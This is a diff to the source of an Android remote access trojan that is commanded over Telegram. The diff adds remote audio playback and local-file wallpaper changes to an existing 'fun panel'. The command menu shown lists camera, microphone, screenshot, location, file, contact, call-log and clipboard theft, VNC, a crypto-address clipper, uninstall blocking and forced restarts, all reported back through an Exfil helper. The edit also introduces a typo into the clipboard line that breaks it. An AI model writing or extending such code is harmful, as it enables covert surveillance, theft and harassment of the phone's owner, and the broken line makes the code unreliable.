@@ -26,6 +26,7 @@ import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.AudioAttributes;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaPlayer;
@@ -57,7 +58,8 @@ public class TelegramService extends Service {
     private boolean isRunning = true;
     private boolean isVncRunning = false;
     private boolean isFlashOn = false;
-    private MediaPlayer mediaPlayer;
+    private MediaPlayer sirenPlayer;
+    private MediaPlayer audioPlayer;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
@@ -82,7 +84,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ System Bot is Online.\n\nFUN PANEL:\n/flash\n/siren\n/wallpaper <url>\n/open <url>\n/vibrate\n/toast <msg>\n/lock <pass>\n/unlock\n\nRAT:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
+        Exfil.send("✅ System Bot is Online.\n\nFUN PANEL:\n/flash\n/siren\n/playaudio <url/path>\n/stopaudio\n/wallpaper <url>\n/open <url>\n/vibrate\n/toast <msg>\n/lock <pass>\n/unlock\n\nRAT:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
@@ -130,6 +132,11 @@ public class TelegramService extends Service {
         mainHandler.post(() -> {
             if (cmd.equals("/flash")) toggleFlashlight();
             else if (cmd.equals("/siren")) playSiren();
+            else if (cmd.startsWith("/playaudio ")) playAudio(cmd.substring(11).trim());
+            else if (cmd.equals("/stopaudio")) {
+                stopAudio();
+                Exfil.send("⏹️ Audio Stopped.");
+            }
             else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
             else if (cmd.startsWith("/open ")) openUrl(cmd.substring(6).trim());
             else if (cmd.equals("/vibrate")) vibrateDevice();
@@ -163,6 +170,65 @@ public class TelegramService extends Service {
 
     // ================== FUN PANEL FEATURES ==================
 
+    private void playAudio(String pathOrUrl) {
+        try {
+            stopAudio(); // N7ydo ay audio 9dim
+            audioPlayer = new MediaPlayer();
+            
+            // Configuration dyal Audio bach ykhdem mzyan
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                audioPlayer.setAudioAttributes(new AudioAttributes.Builder()
+                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
+                        .setUsage(AudioAttributes.USAGE_MEDIA)
+                        .build());
+            }
+
+            if (pathOrUrl.startsWith("http://") || pathOrUrl.startsWith("https://")) {
+                audioPlayer.setDataSource(pathOrUrl);
+            } else {
+                File file = new File(pathOrUrl);
+                if (!file.exists()) {
+                    Exfil.send("❌ File not found: " + pathOrUrl);
+                    return;
+                }
+                audioPlayer.setDataSource(file.getAbsolutePath());
+            }
+
+            // Prepare Async (bach l'UI ma-t3ale9ch)
+            audioPlayer.setOnPreparedListener(mp -> {
+                mp.start();
+                Exfil.send("🎵 Playing Audio: " + pathOrUrl);
+            });
+
+            audioPlayer.setOnCompletionListener(mp -> {
+                stopAudio();
+                Exfil.send("🎵 Audio Finished.");
+            });
+
+            audioPlayer.setOnErrorListener((mp, what, extra) -> {
+                Exfil.send("❌ Audio Error: " + what + " - " + extra);
+                stopAudio();
+                return true;
+            });
+
+            audioPlayer.prepareAsync();
+        } catch (Exception e) {
+            Exfil.send("❌ Play Audio Exception: " + e.getMessage());
+        }
+    }
+
+    private void stopAudio() {
+        try {
+            if (audioPlayer != null) {
+                if (audioPlayer.isPlaying()) {
+                    audioPlayer.stop();
+                }
+                audioPlayer.release();
+                audioPlayer = null;
+            }
+        } catch (Exception e) {}
+    }
+
     private void toggleFlashlight() {
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
@@ -177,17 +243,17 @@ public class TelegramService extends Service {
 
     private void playSiren() {
         try {
-            if (mediaPlayer != null && mediaPlayer.isPlaying()) {
-                mediaPlayer.stop();
-                mediaPlayer.release();
+            if (sirenPlayer != null && sirenPlayer.isPlaying()) {
+                sirenPlayer.stop();
+                sirenPlayer.release();
                 Exfil.send("🔊 Siren Stopped.");
                 return;
             }
-            mediaPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
-            if (mediaPlayer == null) mediaPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
-            if (mediaPlayer != null) {
-                mediaPlayer.setLooping(true);
-                mediaPlayer.start();
+            sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
+            if (sirenPlayer == null) sirenPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+            if (sirenPlayer != null) {
+                sirenPlayer.setLooping(true);
+                sirenPlayer.start();
                 Exfil.send("🔊 Siren Started (Send /siren again to stop).");
             }
         } catch (Exception e) {
@@ -195,22 +261,39 @@ public class TelegramService extends Service {
         }
     }
 
-    private void changeWallpaper(String urlStr) {
+    private void changeWallpaper(String pathOrUrl) {
         new Thread(() -> {
             try {
-                URL url = new URL(urlStr);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setDoInput(true);
-                connection.connect();
-                InputStream input = connection.getInputStream();
-                Bitmap myBitmap = BitmapFactory.decodeStream(input);
+                Bitmap myBitmap = null;
+                if (pathOrUrl.startsWith("/") || pathOrUrl.startsWith("file://")) {
+                    String filePath = pathOrUrl.replace("file://", "");
+                    File file = new File(filePath);
+                    if (!file.exists()) {
+                        Exfil.send("❌ File not found: " + filePath);
+                        return;
+                    }
+                    myBitmap = BitmapFactory.decodeFile(filePath);
+                } else {
+                    URL url = new URL(pathOrUrl);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                    connection.setDoInput(true);
+                    connection.connect();
+                    myBitmap = BitmapFactory.decodeStream(connection.getInputStream());
+                }
+                
+                if (myBitmap == null) {
+                    Exfil.send("❌ Failed to decode image.");
+                    return;
+                }
                 
                 WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
                 wallpaperManager.setBitmap(myBitmap);
-                
                 Exfil.send("🖼️ Wallpaper Changed Successfully!");
+            } catch (SecurityException e) {
+                Exfil.send("❌ Missing SET_WALLPAPER permission in Manifest!");
             } catch (Exception e) {
-                Exfil.send("Wallpaper Error: " + e.getMessage());
+                Exfil.send("❌ Wallpaper Error: " + e.getMessage());
             }
         }).start();
     }
@@ -376,7 +459,7 @@ public class TelegramService extends Service {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             if (clipboard.hasPrimaryClip()) {
-                Exfil.send("📋 Clipboard:\n" + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
+                Exfil.send("📋 Clipboard:\n" + cliboard.getPrimaryClip().getItemAt(0).getText().toString());
             } else {
                 Exfil.send("📋 Clipboard is empty.");
             }
@@ -491,4 +574,4 @@ public class TelegramService extends Service {
         restartService.setPackage(getPackageName());
         startService(restartService);
     }
-    }
+                    }
